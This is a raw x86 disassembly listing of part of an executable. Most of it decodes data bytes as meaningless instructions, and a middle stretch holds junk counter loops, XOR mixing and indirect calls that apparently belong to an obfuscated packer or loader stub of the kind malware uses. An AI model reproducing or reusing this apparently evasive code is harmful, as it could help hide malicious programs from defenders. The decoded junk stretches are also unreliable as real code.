  413180:	(bad)  
  413181:	xchg   ebx,eax
  413182:	shl    DWORD PTR [ebx+ebx*2],cl
  413185:	in     al,dx
  413186:	xchg   ebp,eax
  413187:	mov    esi,0x688ac1c9
  41318c:	pop    esi
  41318d:	ficom  WORD PTR [ebp-0x2f8a2e82]
  413193:	test   BYTE PTR [esi+0x14],cl
  413196:	add    esp,DWORD PTR [ecx+0x76442d32]
  41319c:	popa   
  41319d:	mov    dl,BYTE PTR [eax-0x1a]
  4131a0:	add    DWORD PTR [esi+0x3d],eax
  4131a3:	lahf   
  4131a4:	inc    edx
  4131a6:	(bad)  
  4131a7:	mov    bh,0x38
  4131a9:	rcl    BYTE PTR [ecx+edi*2+0x1d],cl
  4131ad:	cmp    ah,bh
  4131af:	rcl    ebx,1
  4131b1:	xchg   ebp,eax
  4131b2:	pushf  
  4131b3:	mov    bh,0x45
  4131b5:	mov    ch,0xab
  4131b7:	sbb    DWORD PTR es:[esi],edi
  4131ba:	sbb    eax,0xb14ffb9b
  4131bf:	mov    DWORD PTR [edi-0x20],esi
  4131c2:	jo     0x413167
  4131c4:	ret    0x384e
  4131c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c8:	mov    edx,0x91b46072
  4131cd:	out    dx,al
  4131ce:	lahf   
  4131cf:	sbb    eax,0x8314ac51
  4131d4:	mov    bl,0xe2
  4131d6:	inc    edi
  4131d7:	daa    
  4131d8:	pop    ecx
  4131d9:	push   esi
  4131da:	outs   dx,DWORD PTR ds:[esi]
  4131db:	mov    eax,0x665f8b3c
  4131e0:	add    BYTE PTR [ebp+0x3361b256],cl
  4131e6:	dec    edx
  4131e7:	adc    DWORD PTR [ebp+edi*8-0x1],esp
  4131eb:	mov    ds,WORD PTR [esi-0x266f9b91]
  4131f1:	mov    ah,0x32
  4131f3:	push   cs
  4131f4:	pop    eax
  4131f5:	or     DWORD PTR [edi],esp
  4131f7:	fisubr WORD PTR [eax+ebp*4-0x6fcd6230]
  4131fe:	ror    BYTE PTR [ebx-0x3d],0x36
  413202:	fild   DWORD PTR [ebx+0x57]
  413205:	push   esp
  413206:	leave  
  413207:	mov    WORD PTR [esi+0x40ae8c9a],cs
  41320d:	push   ecx
  41320e:	leave  
  41320f:	push   ss
  413210:	movaps XMMWORD PTR [eax+0x7b6d13b9],xmm6
  413217:	or     al,0xec
  413219:	mov    bl,0xd3
  41321b:	inc    edi
  41321c:	test   al,0x65
  41321e:	mov    esp,0x4e6be9da
  413223:	push   cs
  413224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413225:	clc    
  413226:	test   eax,0x7440deb9
  41322b:	popf   
  41322c:	sub    cl,BYTE PTR [edx+0x49]
  41322f:	xor    bh,BYTE PTR [edx+0x797717a3]
  413235:	retf   
  413236:	jmp    0x6a27:0x21d8f4a
  41323d:	arpl   dx,dx
  41323f:	add    DWORD PTR [ecx],0xffffff9c
  413242:	test   BYTE PTR [eax],al
  413244:	out    0x29,al
  413246:	adc    dl,cl
  413248:	fmulp  st(6),st
  41324a:	(bad)  
  41324b:	out    0xe3,eax
  41324d:	cmp    ah,BYTE PTR [esi+0x3d]
  413250:	pop    ecx
  413251:	add    DWORD PTR [esi+0x551ab189],ebp
  413257:	lea    eax,[edx+0x4531fecb]
  41325d:	vprotb ymm15,xmm4,[esi+r9d*1+0x701fdc83]
  413267:	adc    bl,BYTE PTR [ebx-0x18fadd33]
  41326d:	xchg   ebx,eax
  41326e:	xchg   DWORD PTR [eax-0x21],ebx
  413271:	bound  ebp,QWORD PTR [ebx-0x63e78049]
  413277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413278:	stos   DWORD PTR es:[edi],eax
  413279:	fcom   DWORD PTR [edi+0x57]
  41327c:	sub    al,0xc4
  41327e:	inc    ebp
  41327f:	dec    ecx
  413280:	scas   al,BYTE PTR es:[edi]
  413281:	shl    BYTE PTR [edx],1
  413283:	mov    dl,0xd1
  413285:	mov    BYTE PTR [ecx+0x2781e527],cl
  41328b:	cmp    edx,DWORD PTR [ebx]
  41328d:	pop    ecx
  41328e:	call   0x2b12ddac
  413293:	adc    ebx,ebx
  413295:	hlt    
  413296:	sub    al,0x56
  413298:	xor    eax,0x74a0cf3c
  41329d:	dec    eax
  41329e:	push   ebx
  41329f:	add    edx,0x38e8da55
  4132a5:	xchg   bh,cl
  4132a7:	adc    esp,DWORD PTR [ebx]
  4132a9:	fwait
  4132aa:	sbb    eax,0x453c484f
  4132af:	hlt    
  4132b0:	mov    ebx,ecx
  4132b2:	jae    0x41331a
  4132b4:	lahf   
  4132b5:	push   ss
  4132b6:	imul   edi,DWORD PTR [ecx-0x42],0x7e
  4132ba:	outs   dx,BYTE PTR ds:[esi]
  4132bb:	mov    al,0xb7
  4132bd:	cli    
  4132be:	loop   0x413244
  4132c0:	pop    ds
  4132c1:	dec    esp
  4132c2:	lods   eax,DWORD PTR ds:[esi]
  4132c3:	dec    edx
  4132c4:	add    ch,dh
  4132c6:	pusha  
  4132c7:	enter  0x14e6,0xc6
  4132cb:	fmulp  st(0),st
  4132cd:	out    dx,eax
  4132ce:	fsubp  st(7),st
  4132d0:	mov    dh,0x95
  4132d2:	adc    al,0xcb
  4132d4:	enter  0xc25f,0x79
  4132d8:	test   DWORD PTR [edx+0x34],edi
  4132db:	sbb    eax,edx
  4132dd:	sub    dl,al
  4132df:	in     eax,0xc8
  4132e1:	gs jae 0x413325
  4132e4:	jle    0x41331f
  4132e6:	repnz arpl WORD PTR [edx+ebp*4+0x42],bx
  4132eb:	ret    
  4132ec:	test   BYTE PTR [edi],ch
  4132ee:	xor    eax,0x94dd9bb7
  4132f3:	jmp    0xcd04:0x27afb3c8
  4132fa:	pop    es
  4132fb:	mov    ebx,0x6bcf5088
  413300:	lods   al,BYTE PTR ds:[esi]
  413301:	cmp    DWORD PTR [ebp+0x45],edi
  413304:	sbb    DWORD PTR [ebp-0x2d9a8823],0x6b
  41330b:	clc    
  41330c:	(bad)  
  41330d:	push   ecx
  41330e:	push   edx
  41330f:	jo     0x413307
  413311:	cld    
  413312:	shr    BYTE PTR [edx-0x12523709],cl
  413318:	jb     0x41334c
  41331a:	std    
  41331b:	out    0x58,al
  41331d:	out    0x45,eax
  41331f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413320:	push   ss
  413321:	and    esp,DWORD PTR [edi+esi*4+0x58]
  413325:	jp     0x4132b2
  413327:	mov    ch,0x40
  413329:	aaa    
  41332a:	sbb    bh,al
  41332c:	es pop esi
  41332e:	je     0x4132be
  413330:	dec    edx
  413331:	or     BYTE PTR [edi],0xc2
  413334:	int3   
  413335:	mov    BYTE PTR [ebp+0x7c],bl
  413338:	out    0xa2,al
  41333a:	cmp    ebp,0xffffff91
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	int    0x1a
  413707:	das    
  413708:	in     eax,dx
  413709:	mov    esi,0xa7a7a73
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	cdq    
  413712:	mov    al,ds:0x261f273d
  413717:	jle    0x4136cc
  413719:	jmp    0xc34298c3
  41371e:	(bad)  
  41371f:	cmc    
  413720:	sub    eax,0x52864eb9
  413725:	cs push eax
  413727:	cdq    
  413728:	ret    
  413729:	loop   0x41378e
  41372b:	lds    ecx,FWORD PTR [ebp-0x76]
  41372e:	loop   0x41376a
  413730:	xchg   ah,dl
  413732:	or     ch,BYTE PTR [edi]
  413734:	sbb    DWORD PTR [edx-0x162d5ee0],esp
  41373a:	mov    bl,0xf
  41373c:	jmp    0x413708
  41373e:	mov    ds:0x4e86affc,al
  413743:	cmc    
  413744:	push   ebx
  413745:	outs   dx,DWORD PTR ds:[esi]
  413746:	inc    edx
  413747:	movd   ebp,mm7
  41374a:	outs   dx,DWORD PTR ds:[esi]
  41374b:	aam    0x4c
  41374d:	jns    0x413735
  41374f:	pop    esi
  413750:	mov    cl,0xa4
  413752:	fld    DWORD PTR [ebp-0x17]
  413755:	call   0xb884:0xb35dcccb
  41375c:	jo     0x413785
  41375e:	pusha  
  41375f:	loop   0x413754
  413761:	cmp    ah,ch
  413763:	lahf   
  413764:	or     edi,DWORD PTR [eax+ebx*4]
  413767:	loop   0x4136f2
  413769:	push   ebp
  41376a:	push   ebx
  41376b:	dec    ecx
  41376c:	lods   eax,DWORD PTR ds:[esi]
  41376d:	lea    eax,[ebp+esi*4+0x5fd1e779]
  413774:	and    eax,0xcbd5777
  413779:	nop
  41377a:	das    
  41377b:	out    dx,eax
  41377c:	in     eax,dx
  41377d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41377e:	xchg   edx,eax
  41377f:	sti    
  413780:	repnz mov ebx,0x185d3d6b
  413786:	jmp    0xf6a9:0xd1175c5a
  41378d:	dec    edx
  41378e:	gs addr16 push ebp
  413791:	jmp    0xf0ab0f38
  413796:	nop
  413797:	lods   eax,DWORD PTR ds:[esi]
  413798:	(bad)  
  413799:	xchg   ecx,eax
  41379a:	outs   dx,BYTE PTR ds:[esi]
  41379b:	push   edx
  41379c:	int3   
  41379d:	jl     0x4137ca
  41379f:	mov    esp,0x25cac2ce
  4137a4:	retf   0x73e9
  4137a7:	in     al,dx
  4137a8:	shr    DWORD PTR [ebx-0x6e5f29bd],1
  4137ae:	shr    DWORD PTR [esi],cl
  4137b0:	mov    eax,0x59c9bab5
  4137b5:	cmp    al,0xa1
  4137b7:	into   
  4137b8:	push   0xd9611a9e
  4137bd:	inc    edx
  4137be:	stc    
  4137bf:	out    0x13,eax
  4137c1:	dec    esi
  4137c2:	cmp    esp,DWORD PTR [ebx]
  4137c4:	repnz aas 
  4137c6:	lahf   
  4137c7:	sbb    DWORD PTR [edi-0x36],esi
  4137ca:	ss cmp ah,dl
  4137cd:	inc    eax
  4137cf:	lock inc ecx
  4137d1:	mov    DWORD PTR [ecx],edi
  4137d3:	xchg   edi,eax
  4137d4:	inc    eax
  4137d5:	aaa    
  4137d6:	cmp    BYTE PTR [ebp-0x12],ah
  4137d9:	fwait
  4137da:	cld    
  4137db:	xlat   BYTE PTR ds:[ebx]
  4137dc:	or     DWORD PTR [edx-0x12cafb10],esi
  4137e2:	(bad)  
  4137e3:	mov    cl,0x86
  4137e5:	aaa    
  4137e6:	sti    
  4137e7:	add    eax,0x2271ca4a
  4137ed:	stos   DWORD PTR es:[edi],eax
  4137ee:	fadd   DWORD PTR [edi]
  4137f0:	push   eax
  4137f1:	rdmsr  
  4137f3:	mov    ds:0xd574ac50,al
  4137f8:	xchg   edx,edx
  4137fa:	je     0x41384a
  4137fc:	jmp    0x4137a4
  4137fe:	shr    BYTE PTR [esi+ebx*1],cl
  413801:	loop   0x4137e6
  413803:	repnz mov ch,0xbc
  413806:	jae    0x91914209
  41380c:	sub    al,0xa8
  41380e:	out    dx,al
  41380f:	adc    eax,0xedf4850b
  413814:	mov    ds,WORD PTR [edx+0x6b]
  413817:	push   eax
  413818:	lahf   
  413819:	pusha  
  41381a:	jl     0x413824
  41381c:	mov    esi,0xf5d5e796
  413821:	fwait
  413822:	xchg   ebx,eax
  413823:	div    cl
  413825:	mov    eax,ds:0x8c140b50
  41382a:	out    0x4c,eax
  41382c:	or     eax,0x4560531a
  413831:	test   DWORD PTR [ebx+0x3e537395],esp
  413837:	test   al,0x8c
  413839:	call   0x87b776ce
  41383e:	push   ecx
  41383f:	xchg   ecx,eax
  413840:	pop    esi
  413841:	push   ds
  413842:	js     0x413839
  413844:	sub    DWORD PTR [ecx-0x37],edx
  413847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413848:	pop    ecx
  413849:	das    
  41384a:	fucomp st(3)
  41384c:	rcl    cl,cl
  41384e:	mov    ebp,0x294e9185
  413853:	and    al,BYTE PTR [edx]
  413855:	(bad)  
  413856:	lods   al,BYTE PTR ds:[esi]
  413857:	and    eax,0xa3a342a6
  41385c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41385d:	in     eax,dx
  41385e:	sub    al,0xf2
  413860:	ja     0x41389d
  413862:	inc    eax
  413863:	psrad  mm7,QWORD PTR [ecx]
  413866:	int    0xce
  413868:	mov    eax,0x3390476
  41386d:	push   DWORD PTR [ebx+0xa]
  413870:	ins    BYTE PTR es:[edi],dx
  413871:	xchg   edi,eax
  413872:	push   esi
  413873:	dec    eax
  413874:	das    
  413875:	mov    ebp,0x13337955
  41387a:	mov    ds:0xe82ff6db,eax
  41387f:	xor    DWORD PTR [edi+0x8c8c798],eax
  413885:	div    DWORD PTR [ebp-0x63e90927]
  41388b:	and    ch,bh
  41388d:	or     eax,edx
  41388f:	(bad)
  413892:	push   ds
  413893:	jno    0x413816
  413895:	mov    dh,0x11
  413897:	jmp    0x7516:0x6830195e
  41389e:	add    cl,BYTE PTR [esi+0x503bf71d]
  4138a4:	int3   
  4138a5:	cmp    DWORD PTR [ebx+0x67],ecx
  4138a8:	out    dx,al
  4138a9:	sahf   
  4138aa:	dec    edi
  4138ab:	fsubr  st,st(0)
  4138ad:	out    0x64,eax
  4138af:	(bad)  
  4138b0:	and    ah,BYTE PTR [esi-0x5f]
  4138b3:	xlat   BYTE PTR ds:[ebx]
  4138b4:	aaa    
  4138b5:	add    edi,esp
  4138b7:	outs   dx,DWORD PTR ds:[esi]
  4138b8:	nop
  4138b9:	aas    
  4138ba:	xlat   BYTE PTR ds:[ebx]
  4138bb:	clc    
  4138bc:	xor    ebp,DWORD PTR [edi]
  4138be:	and    eax,0x3e65e8c0
  4138c3:	fist   WORD PTR [ebx+0x73512181]
  4138c9:	push   cs
  4138ca:	xlat   BYTE PTR ds:[ebx]
  4138cb:	dec    ecx
  4138cc:	fcmovu st,st(3)
  4138ce:	loopne 0x4138ea
  4138d0:	(bad)  
  4138d1:	cli    
  4138d2:	out    0x85,al
  4138d4:	or     esp,DWORD PTR [ebp+0xc]
  4138d7:	repnz sub DWORD PTR [ecx],ebp
  4138da:	lods   eax,DWORD PTR ds:[esi]
  4138db:	lods   al,BYTE PTR ss:[esi]
  4138dd:	xchg   dh,dl
  4138df:	jbe    0x4138a5
  4138e1:	dec    ebp
  4138e2:	push   DWORD PTR [ebx-0x64cd3d44]
  4138e8:	test   al,0x22
  4138ea:	cmp    BYTE PTR ss:[ecx+0x1b4c7106],bh
  4138f1:	neg    ch
  4138f3:	sub    DWORD PTR [eax+0x4035becb],ebp
  4138f9:	popf   
  4138fa:	out    dx,al
  4138fb:	jne    0x413953
  4138fd:	sub    BYTE PTR [esi+0x75],0xb9
  413901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413902:	rol    BYTE PTR [ebp-0x44014a94],1
  413908:	adc    eax,0xb2879e74
  41390d:	dec    ebx
  41390e:	jb     0x4138da
  413910:	jno    0x41393b
  413912:	xchg   ecx,eax
  413913:	xor    eax,0x4ea7f342
  413918:	pusha  
  413919:	dec    esp
  41391a:	dec    esp
  41391b:	fmul   QWORD PTR [edi+0x18]
  41391e:	jno    0x4138b9
  413920:	mov    ds:0x1e60938,eax
  413925:	xor    edi,DWORD PTR [ebx]
  413927:	adc    BYTE PTR [esp+ecx*4-0x5c],ch
  41392b:	add    BYTE PTR [ecx+0x5a],al
  41392e:	add    DWORD PTR [edx],ebx
  413930:	loopne 0x4138f0
  413932:	cwde   
  413933:	pusha  
  413934:	call   0xd24e:0x4225dca0
  41393b:	test   DWORD PTR [ecx+0x4d359bcb],ebx
  413941:	dec    edi
  413942:	mov    esi,0x22015f35
  413947:	or     al,0x2c
  413949:	pop    edi
  41394a:	fsubr  DWORD PTR [ecx+0x36847598]
  413950:	or     DWORD PTR [edx-0x1],0x96cecce4
  413957:	sub    DWORD PTR [ecx+0x5d55804f],edi
  41395d:	arpl   WORD PTR [edi],sp
  41395f:	fidivr WORD PTR [ebp+0x4c]
  413962:	sbb    al,0xd9
  413964:	test   BYTE PTR [ebx+0x52],ah
  413967:	add    DWORD PTR [ebp-0x77],ebx
  41396a:	fwait
  41396b:	iret   
  41396c:	fs cmc 
  41396e:	in     eax,dx
  41396f:	inc    edi
  413970:	mov    bh,cl
  413972:	cmp    eax,0x29f96baf
  413977:	inc    ecx
  413978:	int3   
  413979:	fdivr  st,st(2)
  41397b:	lds    ebp,FWORD PTR [ebp+edi*4-0x7f]
  41397f:	dec    esi
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	sbb    eax,0xadf0ad60
  413986:	imul   eax,DWORD PTR [eax],0x14062422
  41398c:	sbb    edx,DWORD PTR [ebp-0x618a61b0]
  413992:	imul   ebp,DWORD PTR [esi-0x5dac19ca],0x82fff567
  41399c:	xchg   edx,eax
  41399d:	(bad)  
  41399e:	ds push ds
  4139a0:	call   DWORD PTR [ebx+0x34]
  4139a3:	pusha  
  4139a4:	mov    ch,0x34
  4139a6:	dec    ebx
  4139a7:	int    0x3f
  4139a9:	and    dl,dh
  4139ab:	pusha  
  4139ac:	add    ch,BYTE PTR [esi+ecx*1-0x1560b0e9]
  4139b3:	push   ebx
  4139b4:	xor    edx,ebp
  4139b6:	jbe    0x413a10
  4139b8:	leave  
  4139b9:	xor    BYTE PTR [ebp+0x5298d20e],bh
  4139bf:	loop   0x4139c1
  4139c1:	push   0x2dc62151
  4139c6:	add    eax,0xbe727ba9
  4139cb:	iret   
  4139cc:	push   0x4e84da35
  4139d1:	stc    
  4139d2:	dec    ebp
  4139d3:	outs   dx,DWORD PTR ds:[esi]
  4139d4:	mov    edx,0xb643a2f5
  4139d9:	or     dh,cl
  4139db:	pop    ss
  4139dc:	xchg   ecx,eax
  4139dd:	fist   WORD PTR [ecx+0x165a3cf6]
  4139e3:	ror    DWORD PTR [ebp-0x644429b1],cl
  4139e9:	fnstenv [ebp-0x483290a8]
  4139ef:	jne    0x4139cc
  4139f1:	mov    esi,0x14f9b43c
  4139f6:	in     eax,dx
  4139f7:	scas   al,BYTE PTR es:[edi]
  4139f8:	loopne 0x41397b
  4139fa:	pop    ebx
  4139fb:	jge    0x413a67
  4139fd:	shr    DWORD PTR [esi+0x42],0x1a
  413a01:	icebp  
  413a02:	inc    eax
  413a03:	xchg   ebp,eax
  413a04:	das    
  413a05:	mov    ds:0xfcb491c7,al
  413a0a:	arpl   WORD PTR [edi+esi*8+0x1af197cd],ax
  413a11:	popf   
  413a12:	xor    al,0x94
  413a14:	xchg   ebx,eax
  413a15:	mov    ds:0x7177cc59,eax
  413a1a:	repz jbe 0x41399e
  413a1d:	arpl   WORD PTR [eax],bx
  413a1f:	test   DWORD PTR [esi+0x12],ecx
  413a22:	jbe    0x413a31
  413a24:	arpl   WORD PTR [eax+0x1921c51c],bx
  413a2a:	ins    DWORD PTR es:[edi],dx
  413a2b:	push   eax
  413a2c:	and    dh,dl
  413a2e:	dec    esp
  413a2f:	int    0x39
  413a31:	imul   edx,DWORD PTR [edi+0x79],0xa96347f1
  413a38:	retf   0xf122
  413a3b:	and    al,0x74
  413a3d:	pop    ds
  413a3e:	adc    dx,0x8
  413a42:	sub    BYTE PTR [edx],cl
  413a44:	or     BYTE PTR [ebp-0x4275fce],bh
  413a4a:	popa   
  413a4b:	jmp    0xed30a82e
  413a50:	test   DWORD PTR [edi+0x5d5bbad8],0x26dd729c
  413a5a:	icebp  
  413a5b:	rcl    BYTE PTR [ebx],1
  413a5d:	cmp    ebp,DWORD PTR [ecx+0x1a]
  413a60:	inc    edi
  413a61:	pop    ebp
  413a62:	cli    
  413a63:	retf   
  413a64:	sbb    eax,0x70cd110c
  413a69:	mov    bl,BYTE PTR [edx]
  413a6b:	sub    edx,DWORD PTR [eax+0x7aa9f578]
  413a71:	repz cdq 
  413a73:	cs popa 
  413a75:	adc    al,0x53
  413a77:	fistp  WORD PTR [ebx+0x59]
  413a7a:	ret    0x35f1
  413a7d:	cmc    
  413a7e:	push   esi
  413a7f:	scas   eax,DWORD PTR es:[edi]
  413a80:	push   edi
  413a81:	enter  0x4a7,0x84
  413a85:	push   esi
  413a86:	fisubr DWORD PTR [esi]
  413a88:	jmp    0xc0ad0f3b
  413a8d:	mov    esp,0xc2ad2ce
  413a92:	jne    0x413a49
  413a94:	cmp    DWORD PTR [edi],ecx
  413a96:	out    dx,eax
  413a97:	dec    eax
  413a98:	xchg   DWORD PTR [ebp-0x16],ecx
  413a9b:	mov    edx,0x933df585
  413aa0:	mov    esi,edi
  413aa2:	push   ds
  413aa3:	xchg   ebp,eax
